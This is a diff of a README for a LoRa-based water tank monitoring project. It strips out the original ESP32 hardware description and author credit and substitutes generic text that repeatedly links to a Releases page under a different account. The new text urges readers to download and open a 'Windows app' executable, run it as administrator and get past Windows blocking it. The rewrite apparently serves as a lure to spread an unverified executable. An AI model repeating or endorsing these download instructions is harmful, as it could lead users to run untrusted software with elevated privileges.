@@ -1,116 +1,182 @@
-# Wireless-water-tank-monitoring-lora
-LoRa-based wireless water tank monitoring and motor control system with solar-powered IoT architecture and MQTT integration.
-# 🚰 Wireless Overhead Tank Monitoring & Motor Control System
+# ⚡ Wireless-water-tank-monitoring-lora - Monitor water levels with ease
 
-### (LoRa-Based | Solar Powered | Zero-Maintenance Design)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/tedmunduncertain140/Wireless-water-tank-monitoring-lora/releases)
 
----
+## 🚀 What this does
 
-## 📌 Project Overview
+Wireless-water-tank-monitoring-lora helps you track water tank levels and control a motor from a wireless setup. It uses LoRa for long-range communication, solar power for field devices, and MQTT for message delivery.
 
-Traditional water tank systems:
-- Require wired float switches
-- Fail due to corrosion and wiring issues
-- No remote monitoring
-- No automation capability
+This setup is built for simple monitoring and control. It is useful when the tank or pump is far from your home, office, or control room.
 
-### ✅ Solution
+## 📥 Download
 
-This project implements a **smart wireless water tank monitoring system** using:
+Visit this page to download the latest release for Windows:
 
-- 📡 LoRa Communication
-- 🔋 Solar Powered Tank Unit
-- 📶 Wi-Fi Enabled Home Unit
-- ⚡ Motor Control with HOA (Hand-Off-Auto)
+[Open the Releases page](https://github.com/tedmunduncertain140/Wireless-water-tank-monitoring-lora/releases)
 
----
+On that page, look for the latest release and download the Windows file that matches it. After the file downloads, open it to run the app or installer.
 
-## 🧠 System Architecture
-[Tank Unit] ---> LoRa ---> [Home Unit] ---> LoRa ---> [Actuation Unit]
+## 🖥️ Before you start
 
----
+Use a Windows computer with:
 
-## 🔧 Features
+- Windows 10 or Windows 11
+- An internet connection for the first download
+- At least 200 MB of free disk space
+- A screen with 1366 × 768 resolution or higher
+- Permission to open downloaded files
 
-- 📊 Multi-level water detection (LOW, MID, HIGH, FULL)
-- 🔋 Solar powered (Tank Unit)
-- 📡 Long-range communication using LoRa
-- 📱 Mobile monitoring via MQTT
-- ⚙️ Automatic motor ON/OFF
-- 🔄 Manual override (HOA switch)
-- 🛠 Zero maintenance design
+If your system blocks the file, check the download folder and open the file from there.
 
----
+## 🧭 How to install
 
-## 🧩 Hardware Used
+1. Open the [Releases page](https://github.com/tedmunduncertain140/Wireless-water-tank-monitoring-lora/releases)
+2. Find the newest release at the top
+3. Download the Windows file from the release assets
+4. Wait for the download to finish
+5. Open the downloaded file
+6. If Windows asks for confirmation, choose the option to run or open it
+7. Follow the on-screen steps until setup ends
+8. Open the app from your desktop, Start menu, or install folder
 
-### 🔹 Tank Unit
-- ESP32 + SX1262 LoRa
-- Stainless Steel Probes
-- Solar Panel (12V, 10W)
-- 18650 Batteries + BMS
-- Voltage Regulators
+If the release comes as a ZIP file, right-click it and choose Extract All before you open the app.
 
-### 🔹 Home Unit
-- ESP32 (Wi-Fi + LoRa)
-- OLED Display
-- Buzzer
-- MQTT (HiveMQ / Mosquitto)
+## 📡 How it works
 
-### 🔹 Actuation Unit
-- ESP32 + LoRa
-- Relay / Contactor
-- HOA Switch
-- AC Power Supply
+The system is built around three main parts:
 
----
+- A water tank sensor unit
+- A motor control unit
+- A Windows app for viewing data and sending commands
 
-## 💻 Software & Tools
+The sensor unit checks the tank level and sends data by LoRa. The control unit can switch a pump or motor on and off. The Windows app can receive updates through MQTT and show the current tank status.
 
-| Purpose | Tool |
-|--------|------|
-| Simulation | Wokwi |
-| Backend | Node-RED |
-| MQTT | Mosquitto / HiveMQ |
-| Firmware | PlatformIO (VS Code) |
+This gives you a simple way to watch water levels without being near the tank all the time.
 
+## 🛠️ Main features
 
+- Wireless tank level monitoring
+- LoRa communication for long range use
+- Motor and pump control from a remote unit
+- Solar-powered field hardware support
+- MQTT message support for live updates
+- Simple status display for daily use
+- Built for remote water systems and farm setups
 
+## 🪟 Using the app on Windows
 
-## ⚙️ Working Principle
+After setup, open the app and look for the main dashboard. You will usually see:
 
-### Tank Unit
-- Reads water levels via probes
-- Sends data using LoRa
-- Runs on solar power
+- Tank level
+- Pump state
+- Connection status
+- Message updates
+- Control buttons
 
-### Home Unit
-- Receives data
-- Displays level
-- Sends control commands
+Use the control buttons only when you want to start or stop the motor. If the system shows a low tank level, check the water source and the pump status.
 
-### Actuation Unit
-- Controls motor
-- Supports manual override
+## 🔌 Typical setup parts
 
----
+A full setup may include:
 
+- A tank level sensor
+- A LoRa radio module
+- A motor relay or switch module
+- A solar panel
+- A battery pack
+- A controller board
+- An MQTT broker or server
 
-## 📡 Communication Protocol
+You do not need to manage every part by hand if the system is already built and configured. The Windows app is for day-to-day use.
 
-- Frequency: 868 MHz / 915 MHz
-- Protocol: LoRa (SX1262)
-- Data: Level status + motor command
+## 🧩 First time setup tips
 
----
+- Keep the LoRa units within a range that matches your site
+- Place the tank sensor where it can measure water level well
+- Check that the solar panel gets good daylight
+- Make sure the battery has charge before long use
+- Keep the Windows app and device settings on the same network plan if MQTT is in use
 
-## 📲 Cloud Setup (MQTT)
+## 📊 What you can monitor
 
-1. Install Mosquitto OR use HiveMQ
-2. Create topics:
+The app is meant to help you watch:
 
-3. Use Node-RED dashboard for UI
+- Water tank fill level
+- Low and high water state
+- Motor on and off status
+- Signal health
+- Device connection
+- Message updates from the remote unit
 
+This helps reduce manual checks and keeps the system easier to manage.
 
-## 👨‍💻 Author
-Mowriya Sriram S
+## 🧠 Troubleshooting
+
+### App will not open
+- Open the file again from the Downloads folder
+- Right-click and choose Run as administrator
+- Check if Windows blocked the file
+
+### No tank data appears
+- Check that the LoRa units are powered
+- Confirm the sensor is connected
+- Make sure the remote unit is within range
+
+### Motor does not respond
+- Check the relay wiring
+- Confirm the control unit has power
+- Verify the command reached the device
+
+### MQTT updates do not show
+- Check your network connection
+- Confirm the broker address is correct
+- Make sure the app and device use the same topic setup
+
+## 📁 File names you may see
+
+The release page may include files such as:
+
+- Setup files
+- ZIP packages
+- Windows executables
+- Device firmware files
+- Documentation files
+
+Choose the Windows file for the app first if you only want to run the software on your PC.
+
+## 🔒 Safe use
+
+Only download from the official release page linked above. Keep your system updated and use the app only with hardware you trust and control.
+
+## 📌 Common use cases
+
+- Home water tank monitoring
+- Farm pump control
+- Remote borewell control
+- Solar-powered tank systems
+- Basic industrial water management
+- Small site monitoring with long-range wireless links
+
+## 🧾 Suggested workflow
+
+1. Download the latest release
+2. Install or open the Windows app
+3. Connect the app to your device setup
+4. Check the tank reading
+5. Test motor control
+6. Use it for daily monitoring
+
+## 📝 Project focus
+
+This project is built for clear water tank status and simple remote control. It fits setups where cable runs are hard, where power is limited, or where you need a long-range wireless link between the tank and the control point
+
+## 📞 Need the download again?
+
+[Open the Releases page](https://github.com/tedmunduncertain140/Wireless-water-tank-monitoring-lora/releases)
+
+## 🧰 Good to know
+
+- LoRa is useful for long-range wireless links
+- MQTT is useful for message-based updates
+- Solar power helps in outdoor setups
+- Motor control lets you switch water flow from a remote point
